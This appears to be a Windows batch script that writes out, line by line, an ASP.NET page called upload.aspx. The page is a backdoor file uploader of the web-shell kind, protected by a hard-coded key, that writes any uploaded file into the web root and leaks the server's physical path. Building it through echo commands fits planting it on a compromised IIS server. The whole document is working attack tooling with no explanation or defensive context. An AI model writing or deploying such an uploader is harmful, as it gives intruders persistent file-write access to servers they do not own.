echo ^<%@ Page Language="C#" %^> >> upload.aspx
echo ^<%@ Import Namespace="System.IO" %^> >> upload.aspx
echo ^<head runat="server"^> >> upload.aspx
    echo ^<title^>^</title^> >> upload.aspx
echo ^</head^> >> upload.aspx
echo ^<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"^> >> upload.aspx
echo. >> upload.aspx
echo ^<script runat="server"^> >> upload.aspx
    echo private const string AUTHKEY = "justknow"; >> upload.aspx
    echo private const string HEADER = ^"^<html^>\n^<head^>\n^<title^>filesystembrowser^</title^>\n^<style type=\"text/css\"^>^<!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n--^>\n^</style^>^</head^>\n^<body^>\n^"; >> upload.aspx
    echo private const string FOOTER = ^"^</body^>\n^</html^>\n^"; >> upload.aspx
    echo /// ^<summary^> >> upload.aspx
    echo ///  >> upload.aspx
    echo /// ^</summary^> >> upload.aspx
    echo /// ^<param name="sender"^>^</param^> >> upload.aspx
    echo /// ^<param name="e"^>^</param^> >> upload.aspx
    echo protected void Page_Load(object sender, EventArgs e) >> upload.aspx
    echo { >> upload.aspx
        echo try >> upload.aspx
        echo { >> upload.aspx
            echo if (Request.Params["authkey"] == null) >> upload.aspx
            echo { >> upload.aspx
                echo Response.Write(HEADER); >> upload.aspx
                echo Response.Write(this.GetUploadControls()); >> upload.aspx
                echo Response.Write(FOOTER); >> upload.aspx
                echo return; >> upload.aspx
            echo } >> upload.aspx
echo. >> upload.aspx
            echo if (Request.Params["authkey"] != AUTHKEY) >> upload.aspx
            echo { >> upload.aspx
                echo Response.Write(HEADER); >> upload.aspx
                echo Response.Write(this.GetUploadControls()); >> upload.aspx
                echo Response.Write(FOOTER); >> upload.aspx
                echo return; >> upload.aspx
            echo } >> upload.aspx
            echo. >> upload.aspx
            echo if (Request.Params["operation"] != null) >> upload.aspx
            echo { >> upload.aspx
                echo if (Request.Params["operation"] == "upload") >> upload.aspx
                echo { >> upload.aspx
                    echo Response.Write(HEADER); >> upload.aspx
                    echo Response.Write(this.UploadFile()); >> upload.aspx
                    echo Response.Write(FOOTER); >> upload.aspx
                echo } >> upload.aspx
                echo else >> upload.aspx
                echo { >> upload.aspx
                    echo Response.Write(HEADER); >> upload.aspx
                    echo Response.Write("Unknown operation"); >> upload.aspx
                    echo Response.Write(FOOTER); >> upload.aspx
                echo } >> upload.aspx
            echo } >> upload.aspx
            echo else >> upload.aspx
            echo { >> upload.aspx
                echo Response.Write(HEADER); >> upload.aspx
                echo Response.Write(this.GetUploadControls()); >> upload.aspx
                echo Response.Write(FOOTER); >> upload.aspx
            echo } >> upload.aspx
        echo } >> upload.aspx
        echo catch (Exception ex) >> upload.aspx
        echo { >> upload.aspx
            echo Response.Write(HEADER); >> upload.aspx
            echo Response.Write(ex.Message); >> upload.aspx
            echo Response.Write(FOOTER); >> upload.aspx
        echo } >> upload.aspx
    echo } >> upload.aspx
echo. >> upload.aspx
    echo /// ^<summary^> >> upload.aspx
    echo ///  >> upload.aspx
    echo /// ^</summary^> >> upload.aspx
    echo private string UploadFile() >> upload.aspx
    echo { >> upload.aspx
        echo try >> upload.aspx
        echo { >> upload.aspx
            echo if (Request.Params["authkey"] == null) >> upload.aspx
            echo { >> upload.aspx
                echo return string.Empty; >> upload.aspx
            echo } >> upload.aspx
echo. >> upload.aspx
            echo if (Request.Params["authkey"] != AUTHKEY) >> upload.aspx
            echo { >> upload.aspx
                echo return string.Empty; >> upload.aspx
            echo } >> upload.aspx
            echo. >> upload.aspx
            echo if (Request.Files.Count != 1) >> upload.aspx
            echo { >> upload.aspx
                echo return "No file selected"; >> upload.aspx
            echo } >> upload.aspx
echo. >> upload.aspx
            echo HttpPostedFile httpPostedFile = Request.Files[0]; >> upload.aspx
echo. >> upload.aspx
            echo int fileLength = httpPostedFile.ContentLength; >> upload.aspx
            echo byte[] buffer = new byte[fileLength]; >> upload.aspx
            echo httpPostedFile.InputStream.Read(buffer, 0, fileLength); >> upload.aspx
echo. >> upload.aspx
            echo FileInfo fileInfo = new FileInfo(Request.PhysicalPath); >> upload.aspx
            echo using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.FileName)), FileMode.Create)) >> upload.aspx
            echo { >> upload.aspx
                echo fileStream.Write(buffer, 0, buffer.Length); >> upload.aspx
            echo } >> upload.aspx
echo. >> upload.aspx
            echo return "File uploaded"; >> upload.aspx
        echo } >> upload.aspx
        echo catch (Exception ex) >> upload.aspx
        echo { >> upload.aspx
            echo return ex.ToString(); >> upload.aspx
        echo } >> upload.aspx
    echo } >> upload.aspx
echo. >> upload.aspx
    echo /// ^<summary^> >> upload.aspx
    echo ///  >> upload.aspx
    echo /// ^</summary^> >> upload.aspx
    echo /// ^<returns^>^</returns^> >> upload.aspx
    echo private string GetUploadControls() >> upload.aspx
    echo { >> upload.aspx
        echo string temp = string.Empty; >> upload.aspx
echo. >> upload.aspx
        echo temp = ^"^<form enctype=\"multipart/form-data\" action=\"?operation=upload\" method=\"post\"^>^"; >> upload.aspx
        echo temp += ^"^<br^>Auth Key: ^<input type=\"text\" name=\"authKey\"^>^<br^>^"; >> upload.aspx
        echo temp += ^"^<br^>Please specify a file: ^<input type=\"file\" name=\"file\"^>^</br^>^"; >> upload.aspx
        echo temp += ^"^<div^>^<input type=\"submit\" value=\"Send\"^>^</div^>^"; >> upload.aspx
        echo temp += ^"^</form^>^"; >> upload.aspx
    echo Response.Write("<!-- \n"); >> upload.aspx
    echo Response.Write(Server.MapPath(Page.AppRelativeVirtualPath)); >> upload.aspx
    echo Response.Write("\n-->\n"); >> upload.aspx
        echo return temp; >> upload.aspx
    echo } >> upload.aspx
echo ^</script^> >> upload.aspx
echo. >> upload.aspx
echo ^<!-- Created by Mark Woan (http://www.woanware.co.uk) --^> >> upload.aspx
